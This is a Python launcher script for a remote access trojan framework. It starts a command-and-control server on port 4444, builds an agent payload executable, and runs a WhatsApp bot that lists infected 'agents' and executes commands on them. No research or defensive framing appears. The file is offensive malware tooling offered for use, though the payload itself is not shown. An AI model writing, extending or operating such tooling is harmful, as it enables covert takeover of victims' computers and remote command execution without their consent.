#!/usr/bin/env python3
"""
RAT Framework - Main Entry Point
Unified command for running all framework components
"""

# ═══════════════════════════════════════════════════════════════════════════
# SMART DEPENDENCY AUTO-INSTALLER
# ═══════════════════════════════════════════════════════════════════════════

import subprocess
import sys

def ensure_dependencies():
    """Auto-detect and install missing dependencies"""
    required_packages = {
        'flask': 'flask',
        'yaml': 'pyyaml',
        'cryptography': 'cryptography',
    }
    
    missing = []
    for import_name, package_name in required_packages.items():
        try:
            __import__(import_name)
        except ImportError:
            missing.append((import_name, package_name))
    
    if missing:
        print("⚠️  Missing dependencies detected. Installing...\n")
        for import_name, package_name in missing:
            try:
                print(f"  Installing {package_name}...", end='', flush=True)
                subprocess.check_call([
                    sys.executable, '-m', 'pip', 'install', '-q', package_name
                ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                print(" ✓")
            except Exception as e:
                print(f" ✗")
        print("\n✓ All dependencies ready!\n")

ensure_dependencies()

import argparse
from pathlib import Path

class RATFramework:
    def __init__(self):
        self.workspace = Path(__file__).parent
        
    def verify_environment(self):
        """Check Python environment and dependencies"""
        print("\n" + "=" * 70)
        print("🔍 Verifying Framework Environment")
        print("=" * 70)
        
        try:
            import flask
            print("✓ Flask installed")
        except ImportError:
            print("✗ Flask missing - run: pip install flask")
            return False
            
        try:
            import yaml
            print("✓ PyYAML installed")
        except ImportError:
            print("✗ PyYAML missing - run: pip install pyyaml")
            return False
        
        return True
    
    def run_server(self):
        """Start C2 Server"""
        print("\n" + "=" * 70)
        print("🚀 Starting RAT C2 Server")
        print("=" * 70)
        print("Server will listen on: 0.0.0.0:4444")
        print("API will listen on:    0.0.0.0:5000")
        print("Database:               data/rat_sessions.db")
        print("\nPress Ctrl+C to stop\n")
        
        try:
            subprocess.run([sys.executable, 'rat_server_fixed.py'], cwd=self.workspace)
        except KeyboardInterrupt:
            print("\n\n✓ Server stopped")
    
    def build_agent(self):
        """Build agent executable"""
        print("\n" + "=" * 70)
        print("🏗️  Building Agent Executable")
        print("=" * 70)
        
        try:
            result = subprocess.run(
                [sys.executable, 'rat_executable_builder.py'],
                cwd=self.workspace,
                capture_output=True,
                text=True
            )
            print(result.stdout)
            if result.returncode == 0:
                print("✓ Agent built successfully")
                print(f"Output: {self.workspace}/build/agent_payload.exe")
            else:
                print("✗ Build failed")
                print(result.stderr)
        except Exception as e:
            print(f"✗ Error: {e}")
    
    def run_bot(self):
        """Start WhatsApp Bot"""
        print("\n" + "=" * 70)
        print("🤖 Starting WhatsApp Bot")
        print("=" * 70)
        print("Bot commands:")
        print("  /agents      - List agents")
        print("  /info <id>   - Agent details")
        print("  /exec <id> <cmd> - Execute command")
        print("\nPress Ctrl+C to stop\n")
        
        try:
            subprocess.run(['node', 'bot.js'], cwd=self.workspace / 'whatsapp-c2')
        except KeyboardInterrupt:
            print("\n\n✓ Bot stopped")
        except FileNotFoundError:
            print("✗ Node.js not found - install Node.js or run: npm install")
    
    def run_tests(self):
        """Run integration tests"""
        print("\n" + "=" * 70)
        print("🧪 Running Integration Tests")
        print("=" * 70 + "\n")
        
        try:
            result = subprocess.run(
                [sys.executable, 'phase5_integration_test.py'],
                cwd=self.workspace
            )
            return result.returncode == 0
        except Exception as e:
            print(f"✗ Error: {e}")
            return False
    
    def run_deployment_check(self):
        """Run deployment verification"""
        print("\n" + "=" * 70)
        print("📋 Running Deployment Verification")
        print("=" * 70 + "\n")
        
        try:
            subprocess.run(
                [sys.executable, 'phase5_deployment.py'],
                cwd=self.workspace
            )
        except Exception as e:
            print(f"✗ Error: {e}")
    
    def show_help(self):
        """Show available commands"""
        help_text = """
╔════════════════════════════════════════════════════════════════════════╗
║            RAT Framework - Complete Control Console                    ║
╚════════════════════════════════════════════════════════════════════════╝

USAGE: python startup.py [command]

COMMANDS:
  server      - Start C2 Server (main entry point)
  agent       - Build agent executable
  bot         - Start WhatsApp bot
  test        - Run integration tests
  deploy      - Check deployment readiness
  help        - Show this help message

QUICK START:
  1. python startup.py server   # Terminal 1
  2. python startup.py bot      # Terminal 2
  3. python startup.py agent    # Build & deploy

TESTING:
  python startup.py test        # Verify all components

CONFIGURATION:
  Edit umbrella_config.yaml for server settings

DOCUMENTATION:
  See FRAMEWORK_GUIDE.md for detailed information

════════════════════════════════════════════════════════════════════════════
        """
        print(help_text)

def main():
    framework = RATFramework()
    
    parser = argparse.ArgumentParser(
        description='RAT Framework Control Console',
        add_help=False
    )
    parser.add_argument('command', nargs='?', default='help',
                       choices=['server', 'agent', 'bot', 'test', 'deploy', 'help'])
    
    args = parser.parse_args()
    
    # Verify environment for all commands except help
    if args.command != 'help' and not framework.verify_environment():
        sys.exit(1)
    
    # Route commands
    if args.command == 'server':
        framework.run_server()
    elif args.command == 'agent':
        framework.build_agent()
    elif args.command == 'bot':
        framework.run_bot()
    elif args.command == 'test':
        success = framework.run_tests()
        sys.exit(0 if success else 1)
    elif args.command == 'deploy':
        framework.run_deployment_check()
    else:
        framework.show_help()

if __name__ == '__main__':
    main()
